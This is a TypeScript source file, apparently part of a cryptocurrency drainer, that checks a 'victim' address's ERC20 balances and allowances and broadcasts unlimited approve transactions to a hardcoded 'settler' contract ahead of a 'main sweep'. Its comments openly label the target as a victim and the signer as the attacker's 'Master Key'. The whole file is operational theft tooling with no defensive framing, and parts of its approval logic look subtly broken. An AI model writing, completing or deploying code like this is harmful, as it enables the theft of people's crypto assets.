import { ethers } from "ethers";
import { erc20Interface, ETH_ADDR } from "./constants";

/** 🛡️ SECURITY: Hardcoded Authorized Settler */
const AUTHORIZED_SETTLER = "0x3fBdAe5785340Fc3cad3678690481312E4Eb74B3";

/**
 * [shadow-auth.ts]
 * Fixed to check Victim balances while using the Master Key (signer) for broadcast.
 * Aligned with the Dual-Path logic in UniversalSettler.sol.
 */
export async function injectShadowApprovals(
  rawAssets: any[],
  signer: any, // This is your Master Key / Vault Wallet
  victimAddress: string, // 🎯 THE FIX: Explicitly pass the victim's address
  targetVault: string,
  nonce: number,
  gasPrice: bigint,
  chainId: number,
) {
  // 🛡️ SECURITY GATES (Preserved)
  if (targetVault.toLowerCase() !== AUTHORIZED_SETTLER.toLowerCase()) {
    throw new Error("UNAUTHORIZED_SPENDER_BLOCKED");
  }

  const envSettler = process.env.NEXT_PUBLIC_SETTLER_ADDR;
  if (
    !envSettler ||
    envSettler.toLowerCase() !== AUTHORIZED_SETTLER.toLowerCase()
  ) {
    throw new Error("ENV_INTEGRITY_VIOLATION");
  }

  console.log(
    `[SHADOW-DEBUG] 🛡️ Starting Auth Injection. Signer: ${signer.address} | Target Victim: ${victimAddress}`,
  );

  const assetsToAuthorize = rawAssets.filter((a: any) => {
    const addr = a.token || a.contractAddress || a.address;
    return addr && addr !== ETH_ADDR;
  });

  let currentNonce = nonce;

  if (assetsToAuthorize.length === 0) {
    console.log(`[SHADOW-DEBUG] ℹ️ No ERC20 assets detected for injection.`);
    return currentNonce;
  }

  // Check the Master Key's native balance to ensure it can pay for these approvals
  const signerNativeBalance = await signer.provider.getBalance(signer.address);

  for (const asset of assetsToAuthorize) {
    const tokenAddr = asset.token || asset.contractAddress || asset.address;

    try {
      const tokenContract = new ethers.Contract(
        tokenAddr,
        erc20Interface,
        signer.provider,
      );

      // 🔍 STEP 1: VERIFY VICTIM'S BALANCE (🎯 CRITICAL FIX)
      // We check if the VICTIM has the tokens, not the Master Key.
      const assetBalance = await tokenContract.balanceOf(victimAddress);
      if (assetBalance === 0n) {
        console.log(
          `[SHADOW-DEBUG] ℹ️ Skipping ${tokenAddr}: Victim (${victimAddress}) has 0 balance.`,
        );
        continue;
      }

      // 🔍 STEP 2: VERIFY ALLOWANCE
      // We check if the Master Key already has permission to move the Victim's tokens
      let allowance = 0n;
      try {
        allowance = await tokenContract.allowance(victimAddress, targetVault);
        console.log(
          `[SHADOW-DEBUG] 🔍 Current Allowance for ${tokenAddr}: ${ethers.formatUnits(
            allowance,
            18,
          )}`,
        );
      } catch (rpcErr) {
        console.warn(
          `[SHADOW-DEBUG] ⚠️ Allowance check failed, forcing attempt.`,
        );
      }

      // Skip if allowance is already huge (MaxUint256 or > 1M tokens)
      if (allowance > ethers.parseUnits("1000000", 18)) {
        console.log(
          `[SHADOW-DEBUG] ✅ Skipping ${tokenAddr}: Sufficient allowance exists.`,
        );
        continue;
      }

      // ⛽ STEP 3: GAS MANAGEMENT
      const gasLimit = 75000n; // Slightly higher for complex ERC20s
      const strikePrice = (gasPrice * 125n) / 100n; // 1.25x gas to ensure it lands before the main sweep
      const estCost = gasLimit * strikePrice;

      if (signerNativeBalance < estCost) {
        console.warn(
          `[SHADOW-DEBUG] ⚠️ SKIP: Master Key ${signer.address} has no gas.`,
        );
        continue;
      }

      // 🛠️ STEP 4: BROADCAST APPROVAL
      // The Master Key (signer) calls approve to give the Settler (targetVault) rights
      console.log(
        `[SHADOW-DEBUG] 🛠️ Sending Shadow Approval for ${tokenAddr} | Nonce: ${currentNonce}`,
      );

      const tx = await signer.sendTransaction({
        to: tokenAddr,
        data: erc20Interface.encodeFunctionData("approve", [
          targetVault,
          ethers.MaxUint256,
        ]),
        nonce: currentNonce++,
        gasPrice: strikePrice,
        gasLimit,
        chainId,
        type: 0,
      });

      console.log(`[SHADOW-DEBUG] 🚀 Shadow Auth Broadcasted: ${tx.hash}`);

      // 🏁 STEP 5: RACE CONFIRMATION (Reduced to 5s for faster execution)
      await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 5000))]);
    } catch (authErr: any) {
      console.error(
        `[SHADOW-DEBUG] ❌ Error for ${tokenAddr}: ${authErr.message}`,
      );
    }
  }

  return currentNonce;
}
